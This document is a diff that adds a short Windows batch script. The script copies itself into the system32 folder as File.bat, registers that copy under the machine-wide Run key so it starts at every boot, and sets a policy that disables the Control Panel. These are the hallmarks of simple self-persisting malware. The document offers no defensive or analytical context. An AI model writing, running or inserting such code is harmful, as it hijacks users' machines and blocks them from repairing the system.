@@ -1,0 +1,3 @@
+copy ""%0"" "%SystemRoot%\system32\File.bat" 
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\system32\File.bat" /f 
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
